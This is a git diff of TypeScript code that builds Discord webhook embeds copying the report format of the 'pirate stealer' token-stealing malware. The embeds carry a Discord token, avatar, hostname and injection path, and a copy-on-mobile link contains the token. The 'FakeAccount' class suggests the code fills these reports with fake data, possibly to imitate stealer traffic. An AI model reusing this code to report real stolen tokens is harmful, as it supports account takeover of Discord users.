@@ -1,14 +1,15 @@
-import { ConfigFSBinder } from "../configFSBinder";
-import { FakeAccount } from "../fakeProfile";
-import { getBaseEmbeds } from "./helpers/baseEmbed";
-import { warpInQuote, warpTripleQuote } from "../utils";
 import { WebhookMessageOptions } from "discord.js";
-import { COPY_ON_MOBILE, PARTNER_EMOJI } from "../constants";
+import { ConfigBinder } from "../interfaces";
+import { COPY_ON_MOBILE, PARTNER_EMOJI} from "../constants";
+import { FakeAccount } from "../fakeProfile";
+import { warpInQuote, warpTripleQuote } from "../utils";
+import { getBaseEmbeds } from "./helpers/baseEmbed";
 
-export async function getDiscordInitializedEmbed(config: ConfigFSBinder, account = new FakeAccount()): Promise<WebhookMessageOptions>  {
+export async function getUserLogoutEmbed(config: ConfigBinder, account = new FakeAccount()): Promise<WebhookMessageOptions> {
     const { embeds, webhookMessage} = getBaseEmbeds(config);
     const embed = embeds[0];
-    embed.setTitle("Discord Initalized"); // Misspelled in original pirate stealer
+
+    embed.setTitle("User got logged out");
     const token = account.discord.token;
     embed.setDescription(`[**${PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${COPY_ON_MOBILE}${token})`);
     embed.setThumbnail(await account.discord.getAvatar());
@@ -31,18 +32,6 @@ export async function getDiscordInitializedEmbed(config: ConfigFSBinder, account
     }, {
         name: "Token",
         value: warpTripleQuote(account.discord.token),
-        inline: false
-    }]);
-    return webhookMessage();
-}
-
-export async function getDiscordInitializedEmbedUserNotLoggedIn(config: ConfigFSBinder, account = new FakeAccount()): Promise<WebhookMessageOptions>  {
-    const { embeds, webhookMessage} = getBaseEmbeds(config);
-    const embed = embeds[0];
-    embed.setTitle("Discord Initalized (User not Logged in)"); // Misspelled in original pirate stealer
-    embed.setFields([{
-        name: "Info",
-        value: warpTripleQuote(`Hostname: \n${account.computerName}\nInjection Info: \n${account.injectionPath}\n`),
         inline: false
     }]);
     return webhookMessage();
